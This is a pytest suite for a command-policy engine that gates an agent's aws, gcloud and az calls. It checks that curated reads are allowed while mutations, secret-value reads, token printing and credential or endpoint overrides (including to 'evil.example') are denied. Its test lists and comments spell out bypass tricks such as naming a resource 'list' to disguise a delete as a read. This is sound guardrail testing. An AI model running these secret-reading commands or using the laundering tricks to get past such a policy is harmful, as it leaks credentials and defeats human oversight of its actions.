"""Cloud corpus: read-only cloud CLI packs (aws / gcloud / az) — allow + deny, both environments.

Same contract as ``test_corpus.py`` / ``test_corpus_mutate.py``: the *real* ``config/policy/`` dir
is driven through :class:`YamlRuleEngine`, and every case asserts BOTH the effect AND (where a
named rule is expected) the exact ``rule_id`` — a rule id drifting is as much a regression as an
effect flipping.

The cloud CLIs are argv-only (aws/gcloud/az are just argv0s — no new tool). Their parsing is
deliberately fail-closed: aws/gcloud/az are SUBCOMMAND_BINARIES, so the ACTION is pinned at its
position (aws: ``first_positional``; gcloud/az: ``last_positional`` / token-presence for gcloud
describe), and every value-taking flag is in ``VALUE_FLAGS`` so a space-form operand is CONSUMED,
never leaked into positionals — a leaked/embedded read token in an argument cannot launder a
mutation as a read. Known mutation verbs are denied by a per-family property table
(``*-no-mutations``), and secret-material reads by base.yaml (``deny > allow``).

The gcloud/az reads (this file's last section) are a fail-CLOSED positive ALLOWLIST, not a
denylist: the read allow fires only for curated command PATHS (``verb: <group>`` +
``positional_seq_prefix_any``), so an UNKNOWN verb (``frobnicate``) or an unlisted mutation
(``write``, ``get-credentials``, ``modify-push-config``) DEFAULT-DENYs instead of laundering as a
read. See each pack header for the full rationale.

Every rule is pinned in BOTH staging and prod (the cloud read packs are ``[staging, prod]``).
"""

from __future__ import annotations

from pathlib import Path

import pytest

from opendevops.policy.engine import YamlRuleEngine
from opendevops.policy.loader import load_policy
from opendevops.policy.schema import Decision, ToolCallCtx

REPO_ROOT = Path(__file__).resolve().parents[3]
SHIPPED_POLICY_DIR = REPO_ROOT / "config" / "policy"

ALLOWED_CONTEXTS = ["kind-opendevops"]


def _resolver(ref: str) -> list[str]:
    if ref == "${targets.kubernetes.allowed_contexts}":
        return ALLOWED_CONTEXTS
    if ref == "${targets.ssh.hosts}":  # ssh_run host allowlist ref
        return ["allowed.host.internal"]
    if ref == "${targets.github.write_repos}":  # gh-write repo allowlist ref
        return ["octo-org/staging-app"]
    raise AssertionError(f"unexpected config ref {ref!r}")


@pytest.fixture(scope="module")
def engine() -> YamlRuleEngine:
    return YamlRuleEngine(load_policy(SHIPPED_POLICY_DIR), _resolver)


def _cmd(argv: object, environment: str) -> ToolCallCtx:
    return ToolCallCtx(
        tool_name="run_command",
        args={"argv": argv},
        environment=environment,
        principal="tester",
        run_id="run-corpus-p5",
    )


async def _decide(engine: YamlRuleEngine, ctx: ToolCallCtx) -> Decision:
    return await engine.decide(ctx)


ENVIRONMENTS = ["staging", "prod"]

# ---------------------------------------------------------------------------- allows (ro, both env)

# (argv, expected_rule_id)
ALLOWS = [
    # aws — describe-*/list-*/get-* reads. The action is pinned at first_positional.
    (["aws", "sts", "get-caller-identity"], "aws-read-actions"),
    (
        ["aws", "ec2", "describe-instances", "--region=us-east-1", "--output=json"],
        "aws-read-actions",
    ),
    (["aws", "ec2", "describe-instances"], "aws-read-actions"),
    (["aws", "s3", "ls"], "aws-read-actions"),
    (["aws", "cloudformation", "list-stacks"], "aws-read-actions"),
    # ssm get-parameter WITHOUT --with-decryption is a plain read (SecureString stays ciphertext)
    (["aws", "ssm", "get-parameter", "--name=/app/db-host"], "aws-read-actions"),
    # secretsmanager describe-secret is metadata only (the VALUE getter is denied below)
    (["aws", "secretsmanager", "describe-secret", "--secret-id=app/creds"], "aws-read-actions"),
    # gcloud — curated read-path allowlist (fix round 3): verb-group + [<subgroup...>, <read-verb>]
    (["gcloud", "compute", "instances", "list"], "gcloud-read-compute"),
    (["gcloud", "projects", "list", "--project=p"], "gcloud-read-projects"),
    (
        ["gcloud", "compute", "instances", "describe", "my-vm", "--zone=us-central1-a"],
        "gcloud-read-compute",
    ),
    (["gcloud", "container", "clusters", "list"], "gcloud-read-container"),
    (["gcloud", "sql", "instances", "describe", "db"], "gcloud-read-sql"),
    (["gcloud", "logging", "read", "severity>=ERROR"], "gcloud-read-logging"),
    (["gcloud", "logging", "logs", "list"], "gcloud-read-logging"),
    (["gcloud", "storage", "ls", "gs://b"], "gcloud-read-storage"),
    (["gcloud", "secrets", "list"], "gcloud-read-secrets"),
    (["gcloud", "iam", "service-accounts", "list"], "gcloud-read-iam"),
    # az — curated read-path allowlist (fix round 3; targets via flags, incl. short forms -n/-g)
    (["az", "vm", "list"], "az-read-vm"),
    (["az", "vm", "show", "--name=v", "--resource-group=g"], "az-read-vm"),
    (["az", "vm", "show", "-n", "v", "-g", "g"], "az-read-vm"),  # short flags now canonicalize
    (["az", "account", "show"], "az-read-account"),
    (["az", "storage", "account", "list"], "az-read-storage"),
    (["az", "network", "vnet", "list"], "az-read-network"),
    # az keyvault LIST (vault names) is a read; keyvault SECRET is denied below
    (["az", "keyvault", "list"], "az-read-keyvault"),
]


@pytest.mark.parametrize("environment", ENVIRONMENTS)
@pytest.mark.parametrize(("argv", "rule_id"), ALLOWS)
async def test_cloud_reads_allowed(
    engine: YamlRuleEngine, argv: list[object], rule_id: str, environment: str
) -> None:
    d = await _decide(engine, _cmd(argv, environment))
    assert d.effect == "allow"
    assert d.rule_id == rule_id
    assert d.channel == "ro"


# -------------------------------------------------------- secret-material reads (named deny)

SECRET_READS = [
    # aws — value getters / credential minters, pinned at first_positional (aws-no-secret-reads)
    (["aws", "secretsmanager", "get-secret-value", "--secret-id=app/creds"], "aws-no-secret-reads"),
    (["aws", "kms", "decrypt", "--ciphertext-blob=x"], "aws-no-secret-reads"),
    (["aws", "ec2", "get-password-data", "--instance-id=i-1"], "aws-no-secret-reads"),
    (["aws", "sts", "get-session-token"], "aws-no-secret-reads"),
    (["aws", "sts", "get-federation-token", "--name", "s"], "aws-no-secret-reads"),
    (["aws", "ecr", "get-login-password"], "aws-no-secret-reads"),
    (["aws", "ecr", "get-authorization-token"], "aws-no-secret-reads"),
    (["aws", "rds", "generate-db-auth-token", "--hostname", "h"], "aws-no-secret-reads"),
    # aws — ssm SecureString plaintext via --with-decryption
    (["aws", "ssm", "get-parameter", "--name=/app/pw", "--with-decryption"], "aws-no-ssm-decrypt"),
    # gcloud — secret payload access + credential/identity token print + SA key material
    (
        ["gcloud", "secrets", "versions", "access", "1", "--secret=api-key"],
        "gcloud-no-secret-access",
    ),
    (["gcloud", "auth", "print-access-token"], "gcloud-no-token-print"),
    (["gcloud", "auth", "print-identity-token"], "gcloud-no-token-print"),
    (
        ["gcloud", "iam", "service-accounts", "keys", "list", "--iam-account", "a@b"],
        "gcloud-no-sa-keys",
    ),
    (
        ["gcloud", "iam", "service-accounts", "keys", "create", "k.json", "--iam-account", "a@b"],
        "gcloud-no-sa-keys",
    ),
    # az — keyvault secret, * keys list (connection strings / access keys), acr/sp credential
    (["az", "keyvault", "secret", "show", "--name=s", "--vault-name=vv"], "az-no-secret-reads"),
    (
        ["az", "keyvault", "secret", "download", "--name=s", "--vault-name=vv", "--file=/x"],
        "az-no-secret-reads",
    ),
    (["az", "acr", "credential", "show", "--name", "reg"], "az-no-secret-reads"),
    (["az", "cosmosdb", "keys", "list", "--name", "c", "-g", "g"], "az-no-secret-reads"),
    (["az", "functionapp", "keys", "list", "--name", "f", "-g", "g"], "az-no-secret-reads"),
    (["az", "storage", "account", "keys", "list", "--account-name", "s"], "az-no-secret-reads"),
    (["az", "ad", "sp", "credential", "list", "--id", "x"], "az-no-secret-reads"),
]


@pytest.mark.parametrize("environment", ENVIRONMENTS)
@pytest.mark.parametrize(("argv", "rule_id"), SECRET_READS)
async def test_cloud_secret_reads_denied(
    engine: YamlRuleEngine, argv: list[object], rule_id: str, environment: str
) -> None:
    d = await _decide(engine, _cmd(argv, environment))
    assert d.effect == "deny"
    assert d.rule_id == rule_id


# ------------------------------------------------------------ cred/identity overrides (named deny)

CRED_OVERRIDES = [
    (
        ["aws", "--endpoint-url=http://evil.example", "ec2", "describe-instances"],
        "aws-no-endpoint-override",
    ),
    (["gcloud", "projects", "list", "--account=attacker@evil.example"], "gcloud-no-cred-override"),
    (
        ["gcloud", "compute", "instances", "list", "--impersonate-service-account=x@y"],
        "gcloud-no-cred-override",
    ),
    (
        ["gcloud", "compute", "instances", "list", "--configuration=other"],
        "gcloud-no-cred-override",
    ),
    (
        ["az", "account", "show", "--subscription=sub-in-another-tenant"],
        "az-no-subscription-override",
    ),
]


@pytest.mark.parametrize("environment", ENVIRONMENTS)
@pytest.mark.parametrize(("argv", "rule_id"), CRED_OVERRIDES)
async def test_cloud_cred_overrides_denied(
    engine: YamlRuleEngine, argv: list[object], rule_id: str, environment: str
) -> None:
    d = await _decide(engine, _cmd(argv, environment))
    assert d.effect == "deny"
    assert d.rule_id == rule_id


# -------------------------------------------------------------- explicit high-value mutation denies

EXPLICIT_MUTATION_DENIES = [
    (["aws", "ec2", "terminate-instances", "--instance-ids=i-1"], "aws-no-terminate-instances"),
    (["aws", "iam", "list-users"], "aws-no-iam"),  # iam denied wholesale (reads + writes)
    (["aws", "iam", "create-user", "--user-name=bob"], "aws-no-iam"),
    (["gcloud", "compute", "instances", "delete", "my-vm"], "gcloud-no-delete"),
    (["az", "vm", "delete", "--name=v", "--resource-group=g"], "az-no-delete"),
    (["az", "group", "delete", "--name=g"], "az-no-delete"),
]


@pytest.mark.parametrize("environment", ENVIRONMENTS)
@pytest.mark.parametrize(("argv", "rule_id"), EXPLICIT_MUTATION_DENIES)
async def test_cloud_explicit_mutation_denies(
    engine: YamlRuleEngine, argv: list[object], rule_id: str, environment: str
) -> None:
    d = await _decide(engine, _cmd(argv, environment))
    assert d.effect == "deny"
    assert d.rule_id == rule_id


# ------------------------------------------------------------------- REGRESSION: fail-open closed
#
# The reviewer's finding: a MUTATION carrying a read token (in a flag value, or embedded/appended as
# a positional) resolved to `effect: allow` — laundering a mutation as a read. Each of these MUST
# now resolve to DENY (not allow). We assert `effect == deny` (the invariant); the rule id that
# catches it is noted for provenance but the pin is on the effect.

MUTATION_WITH_READ_TOKEN_DENIED = [
    # aws — the read token rides a value flag; the action stays pinned at first_positional and
    # falls to __default_deny__ (the read allow cannot fire).
    ["aws", "cloudformation", "delete-stack", "--stack-name", "describe-stacks"],
    ["aws", "dynamodb", "delete-table", "--table-name", "ls"],
    ["aws", "lambda", "delete-function", "--function-name", "list-functions"],
    ["aws", "rds", "delete-db-instance", "--db-instance-identifier", "describe-db-instances"],
    ["aws", "ec2", "terminate-instances", "--instance-ids", "describe-instances"],
    # gcloud — read token consumed by --project / trailing; mutation table (or default-deny) wins.
    ["gcloud", "compute", "instances", "delete", "my-vm", "--project", "list"],
    ["gcloud", "projects", "add-iam-policy-binding", "p", "describe"],
    # az — read token consumed by --name; mutation table wins.
    ["az", "vm", "create", "--name", "show", "--resource-group", "g"],
    # az — a mutation that additionally TRAILS a literal read verb is still caught by the table.
    ["az", "vm", "delete", "--name", "x", "--resource-group", "g", "list"],
    ["gcloud", "compute", "instances", "delete", "a", "b", "list"],
]


@pytest.mark.parametrize("environment", ENVIRONMENTS)
@pytest.mark.parametrize("argv", MUTATION_WITH_READ_TOKEN_DENIED)
async def test_cloud_mutation_with_read_token_denied(
    engine: YamlRuleEngine, argv: list[object], environment: str
) -> None:
    d = await _decide(engine, _cmd(argv, environment))
    assert d.effect == "deny", f"{argv} laundered a mutation as a read: {d.effect}/{d.rule_id}"
    assert d.channel is None


# ---------------------------------------- broad property pin: known mutation verbs per family deny
#
# A table of representative mutation verbs per family — each, at its natural action position, must
# DENY. This is the property-style guard that a shipped read pack never admits a mutation.

_GCLOUD_MUTATION_VERBS = [
    "create", "update", "patch", "replace", "set", "add", "remove", "deploy", "apply", "import",
    "insert", "start", "stop", "restart", "reset", "resize", "scale", "attach", "detach", "enable",
    "disable", "promote", "failover", "rollback", "undelete", "purge", "add-iam-policy-binding",
    "remove-iam-policy-binding", "set-iam-policy", "delete",
]
_AZ_MUTATION_VERBS = [
    "create", "update", "set", "add", "remove", "start", "stop", "restart", "reset", "deallocate",
    "redeploy", "deploy", "purge", "move", "attach", "detach", "enable", "disable", "regenerate",
    "renew", "invoke", "import", "restore", "failover", "delete",
]
_AWS_MUTATION_ACTIONS = [
    "run-instances", "create-stack", "delete-stack", "put-object", "delete-object",
    "create-user", "attach-role-policy", "modify-db-instance",
]

CLOUD_MUTATIONS = (
    [["gcloud", "compute", "instances", v, "x"] for v in _GCLOUD_MUTATION_VERBS]
    + [["az", "vm", v, "--name", "x"] for v in _AZ_MUTATION_VERBS]
    + [["aws", "ec2", a] for a in _AWS_MUTATION_ACTIONS]
)


@pytest.mark.parametrize("environment", ENVIRONMENTS)
@pytest.mark.parametrize("argv", CLOUD_MUTATIONS)
async def test_cloud_known_mutation_verbs_denied(
    engine: YamlRuleEngine, argv: list[object], environment: str
) -> None:
    d = await _decide(engine, _cmd(argv, environment))
    assert d.effect == "deny", f"{argv} resolved to {d.effect}/{d.rule_id}"


# -------------------------- Fix round 2: executable gcloud/az mutations that ALLOWed (residual)
#
# The fix-round-1 residual (adversarial re-review): real, EXECUTABLE gcloud mutations still resolved
# to `allow / gcloud-read-verbs` because gcloud puts the resource NAME *after* the verb, so a
# mutation could be NAMED with a read token (`suspend list` suspends an instance named `list`;
# `clone prod-db describe` names the clone DESTINATION `describe`) and satisfy the read matchers
# (`last_positional == list`, or the old any-positional `resource_any:[describe]`). Each MUST now
# DENY. We pin the invariant (`effect == deny`) and note the rule that catches it for provenance.

FIX_R2_RESIDUAL_DENIED = [
    # (argv, catching_rule_id) — the reviewer's exact executable residuals.
    # `last_positional == list` fired the read allow; the completed bare denylist now denies.
    (["gcloud", "compute", "instances", "suspend", "list", "--zone=z"], "gcloud-no-mutations"),
    (["gcloud", "compute", "instances", "resume", "list", "--zone=z"], "gcloud-no-mutations"),
    (
        ["gcloud", "compute", "instances", "simulate-maintenance-event", "list", "--zone=z"],
        "gcloud-no-mutations",
    ),
    # reset-windows-password ALSO mints a credential; must never allow.
    (
        ["gcloud", "compute", "instances", "reset-windows-password", "list", "--zone=z"],
        "gcloud-no-mutations",
    ),
    # clone: the clone DESTINATION is NAMED `describe` — fully attacker-controlled, no coincidence.
    # The read-describe rule no longer matches (describe is the LAST positional, not second-to-last)
    # and `clone` is a listed mutation.
    (["gcloud", "sql", "instances", "clone", "prod-db", "describe"], "gcloud-no-mutations"),
    # ...and the mirror where `describe` lands SECOND-TO-LAST on the clone (would satisfy the read
    # allow) is caught by deny > allow.
    (["gcloud", "sql", "instances", "clone", "describe", "prod-db"], "gcloud-no-mutations"),
    (["gcloud", "container", "clusters", "upgrade", "list", "--zone=z"], "gcloud-no-mutations"),
    # COMPOUND verb-noun mutations the bare denylist can't see -> the prefix guard catches them.
    (
        ["gcloud", "compute", "instances", "set-machine-type", "list", "--zone=z",
         "--machine-type=n1"],
        "__default_deny__",
    ),
    (
        ["gcloud", "compute", "instances", "add-metadata", "list", "--zone=z"],
        "gcloud-no-compound-mutations",
    ),
    (
        ["gcloud", "compute", "instances", "remove-metadata", "list", "--zone=z"],
        "gcloud-no-compound-mutations",
    ),
    (
        ["gcloud", "compute", "instances", "delete-access-config", "list", "--zone=z"],
        "gcloud-no-compound-mutations",
    ),
    # az — non-executable residual (targets are flags), hardened anyway. `generalize list` denies.
    (["az", "vm", "generalize", "list"], "az-no-mutations"),
]


@pytest.mark.parametrize("environment", ENVIRONMENTS)
@pytest.mark.parametrize(("argv", "rule_id"), FIX_R2_RESIDUAL_DENIED)
async def test_fix_round_2_executable_residuals_denied(
    engine: YamlRuleEngine, argv: list[object], rule_id: str, environment: str
) -> None:
    d = await _decide(engine, _cmd(argv, environment))
    assert d.effect == "deny", f"{argv} laundered a mutation as a read: {d.effect}/{d.rule_id}"
    assert d.rule_id == rule_id
    assert d.channel is None


# ------------- Fix round 2 property pin: every mutation verb NAMED with a read token denies
#
# For a big list of gcloud/az bare mutation verbs AND compound verb-noun forms, EVERY
# `<cli> <group> <verb> <name-that-is-a-read-token>` must DENY — regardless of how the target is
# named. This is the invariant: NO gcloud/az mutation may resolve to allow.

_GCLOUD_BARE_MUTATIONS = [
    "create", "update", "patch", "replace", "set", "add", "remove", "deploy", "apply", "import",
    "export", "insert", "start", "stop", "restart", "reset", "resize", "scale", "attach", "detach",
    "enable", "disable", "promote", "failover", "rollback", "undelete", "purge", "suspend",
    "resume", "clone", "upgrade", "downgrade", "destroy", "diagnose", "abandon", "drain",
    "recreate", "cancel", "activate", "rotate", "migrate", "restore", "revoke", "wait", "invoke",
    "ssh", "scp", "generalize", "reset-windows-password", "simulate-maintenance-event",
    "tunnel-through-iap", "add-iam-policy-binding", "remove-iam-policy-binding", "set-iam-policy",
    "delete",
]
_GCLOUD_COMPOUND_MUTATIONS = [
    "set-machine-type", "add-metadata", "remove-metadata", "update-container", "add-access-config",
    "set-scopes", "set-disk-auto-delete", "add-tags", "remove-tags", "delete-access-config",
    "set-scheduling", "add-labels", "update-from-file", "import-keys", "export-image",
]
_AZ_MUTATION_VERBS_R2 = [
    "create", "update", "set", "add", "remove", "start", "stop", "restart", "reset", "deallocate",
    "redeploy", "deploy", "purge", "move", "attach", "detach", "enable", "disable", "regenerate",
    "renew", "invoke", "import", "restore", "failover", "generalize", "capture", "clone",
    "upgrade", "migrate", "cancel", "wait", "revoke", "rotate", "delete", "run-command",
    "reset-ssh", "set-orchestrator",
]

# Read tokens an attacker could name the target resource to try to launder the mutation as a read.
_READ_TOKENS = ["list", "describe", "get", "show"]

CLOUD_MUTATION_NAMED_AS_READ = (
    [
        ["gcloud", "compute", "instances", v, tok]
        for v in _GCLOUD_BARE_MUTATIONS + _GCLOUD_COMPOUND_MUTATIONS
        for tok in _READ_TOKENS
    ]
    + [["az", "vm", v, tok] for v in _AZ_MUTATION_VERBS_R2 for tok in _READ_TOKENS]
)


@pytest.mark.parametrize("environment", ENVIRONMENTS)
@pytest.mark.parametrize("argv", CLOUD_MUTATION_NAMED_AS_READ)
async def test_cloud_mutation_named_as_read_token_denied(
    engine: YamlRuleEngine, argv: list[object], environment: str
) -> None:
    d = await _decide(engine, _cmd(argv, environment))
    assert d.effect == "deny", f"{argv} laundered a mutation as a read: {d.effect}/{d.rule_id}"
    assert d.channel is None


# --------------------------------- mutations with no read token -> default-deny (aws robust)

# aws reads are pinned at first_positional, so an unlisted aws action (even trailing a read token)
# robustly falls to __default_deny__ with no explicit rule.
DEFAULT_DENY_MUTATIONS = [
    ["aws", "ec2", "run-instances", "--image-id=ami-1"],
    ["aws", "s3", "rm", "s3://bucket/key"],
    # a leaked read token as a trailing positional still does not reach first_positional
    ["aws", "ec2", "run-instances", "describe-instances"],
]


@pytest.mark.parametrize("environment", ENVIRONMENTS)
@pytest.mark.parametrize("argv", DEFAULT_DENY_MUTATIONS)
async def test_cloud_mutations_default_deny(
    engine: YamlRuleEngine, argv: list[object], environment: str
) -> None:
    d = await _decide(engine, _cmd(argv, environment))
    assert d.effect == "deny"
    assert d.rule_id == "__default_deny__"


# ---------------------------------------------------------- unlisted flag -> flag_not_allowed

# (argv, flag_that_should_be_named_in_reason)
UNLISTED_FLAGS = [
    # --cli-input-json lets an aws call supply an arbitrary request body — deliberately not allowed.
    (["aws", "ec2", "describe-instances", "--cli-input-json={}"], "--cli-input-json"),
    (["gcloud", "compute", "instances", "list", "--log-http"], "--log-http"),
    (["az", "vm", "list", "--debug"], "--debug"),
]


@pytest.mark.parametrize("environment", ENVIRONMENTS)
@pytest.mark.parametrize(("argv", "flag"), UNLISTED_FLAGS)
async def test_cloud_unlisted_flag_denied(
    engine: YamlRuleEngine, argv: list[object], flag: str, environment: str
) -> None:
    d = await _decide(engine, _cmd(argv, environment))
    assert d.effect == "deny"
    assert d.rule_id == "__flag_not_allowed__"
    assert flag in d.reason


# ============================================================================================
# Fix round 3: ALLOWLIST INVERSION for gcloud/az reads (fail-CLOSED, not fail-open)
#
# Adversarial re-review proved the gcloud/az read allow was STILL fail-open BY CONSTRUCTION: it
# fired for ANY command ending in a read verb (`last_positional in [list, describe]` /
# `second_last_positional == describe`) and subtracted mutations via a DENYLIST that can never be
# complete. Concrete proof: `gcloud logging write list list` (log-entry forgery — fully
# attacker-controlled, no required flags) and `gcloud compute instances frobnicate list` (an
# INVENTED verb) both resolved to `allow / gcloud-read-verbs`.
#
# Fix round 3 REPLACES the two broad rules with a CURATED POSITIVE ALLOWLIST of read command paths
# (one allow rule per service group, pinning `verb: <group>` + `positional_seq_prefix_any:
# [[<subgroup...>, <read-verb>], ...]`). An UNKNOWN verb, an unlisted mutation, or an unknown group
# no longer occupies a read verb's position, so it DEFAULT-DENYs. The allow is now the PRIMARY
# fail-closed gate; the mutation/secret denies remain belt-and-braces.
# ============================================================================================

# These EXACT argvs were ALLOWED in round 2 (fail-open) and MUST now DEFAULT-DENY. The read verb no
# longer sits at a pinned position for a curated path, so no allow fires and nothing else matches ->
# `__default_deny__`.
ALLOWLIST_INVERSION_DENIED = [
    # `write` is an unlisted mutation (log-entry injection/forgery); it is NOT in any read path.
    ["gcloud", "logging", "write", "list", "list"],
    ["gcloud", "logging", "write", "describe", "payload"],
    # an INVENTED verb at the action position of a real group path.
    ["gcloud", "compute", "instances", "frobnicate", "list", "--zone=z"],
    # an unknown GROUP entirely.
    ["gcloud", "foo", "frobnicate", "describe", "bar"],
    # unlisted mutations that end in / carry a read token.
    ["gcloud", "container", "clusters", "get-credentials", "list", "--zone=z"],
    ["gcloud", "pubsub", "subscriptions", "modify-push-config", "list"],
]


@pytest.mark.parametrize("environment", ENVIRONMENTS)
@pytest.mark.parametrize("argv", ALLOWLIST_INVERSION_DENIED)
async def test_fix_round_3_allowlist_inversion_default_denies(
    engine: YamlRuleEngine, argv: list[object], environment: str
) -> None:
    d = await _decide(engine, _cmd(argv, environment))
    assert d.effect == "deny", f"{argv} still fires the read allow: {d.effect}/{d.rule_id}"
    assert d.rule_id == "__default_deny__", f"{argv} -> {d.rule_id}"
    assert d.channel is None


# PROPERTY PIN (the core inversion): an UNKNOWN/INVENTED verb — and the reviewer-named unlisted
# mutations `write` / `get-credentials` / `modify-push-config` — at the ACTION position of a real
# group path, across every supported service, must DEFAULT-DENY. A denylist could never enumerate
# these; the allowlist rejects them because the read verb's position is DETERMINATE.
_UNKNOWN_VERBS = [
    "frobnicate", "wibble", "zorp", "quux",
    "write", "get-credentials", "modify-push-config",
]

CLOUD_UNKNOWN_VERB_PATHS = (
    [["gcloud", "compute", "instances", v, "list"] for v in _UNKNOWN_VERBS]
    + [["gcloud", "compute", "instances", v] for v in _UNKNOWN_VERBS]
    + [["gcloud", "container", "clusters", v, "list"] for v in _UNKNOWN_VERBS]
    + [["gcloud", "sql", "instances", v, "x"] for v in _UNKNOWN_VERBS]
    + [["gcloud", "pubsub", "subscriptions", v, "list"] for v in _UNKNOWN_VERBS]
    + [["gcloud", "logging", v, "x"] for v in _UNKNOWN_VERBS]
    + [["gcloud", "projects", v, "x"] for v in _UNKNOWN_VERBS]
    + [["gcloud", "iam", "service-accounts", v, "list"] for v in _UNKNOWN_VERBS]
    + [["gcloud", "storage", v, "gs://b"] for v in _UNKNOWN_VERBS]
    + [["az", "vm", v] for v in _UNKNOWN_VERBS]
    + [["az", "storage", "account", v] for v in _UNKNOWN_VERBS]
    + [["az", "keyvault", v] for v in _UNKNOWN_VERBS]
    + [["az", "network", "vnet", v] for v in _UNKNOWN_VERBS]
    + [["az", "account", v] for v in _UNKNOWN_VERBS]
)


@pytest.mark.parametrize("environment", ENVIRONMENTS)
@pytest.mark.parametrize("argv", CLOUD_UNKNOWN_VERB_PATHS)
async def test_fix_round_3_unknown_verbs_default_deny(
    engine: YamlRuleEngine, argv: list[object], environment: str
) -> None:
    d = await _decide(engine, _cmd(argv, environment))
    assert d.effect == "deny", f"{argv} fired an allow for an unknown verb: {d.effect}/{d.rule_id}"
    assert d.rule_id == "__default_deny__", f"{argv} -> {d.rule_id}"
    assert d.channel is None


# The allowlist must STILL ALLOW the curated legitimate reads (the inversion is not over-broad).
FIX_R3_STILL_ALLOWED = [
    (["gcloud", "compute", "instances", "list"], "gcloud-read-compute"),
    (["gcloud", "compute", "instances", "describe", "my-vm"], "gcloud-read-compute"),
    (["gcloud", "container", "clusters", "list"], "gcloud-read-container"),
    (["gcloud", "sql", "instances", "describe", "db"], "gcloud-read-sql"),
    (["gcloud", "logging", "read"], "gcloud-read-logging"),
    (["gcloud", "secrets", "list"], "gcloud-read-secrets"),
    (["az", "vm", "list"], "az-read-vm"),
    (["az", "vm", "show", "-n", "v", "-g", "g"], "az-read-vm"),
    (["az", "storage", "account", "list"], "az-read-storage"),
]


@pytest.mark.parametrize("environment", ENVIRONMENTS)
@pytest.mark.parametrize(("argv", "rule_id"), FIX_R3_STILL_ALLOWED)
async def test_fix_round_3_curated_reads_still_allowed(
    engine: YamlRuleEngine, argv: list[object], rule_id: str, environment: str
) -> None:
    d = await _decide(engine, _cmd(argv, environment))
    assert d.effect == "allow", f"{argv} -> {d.effect}/{d.rule_id}"
    assert d.rule_id == rule_id
    assert d.channel == "ro"
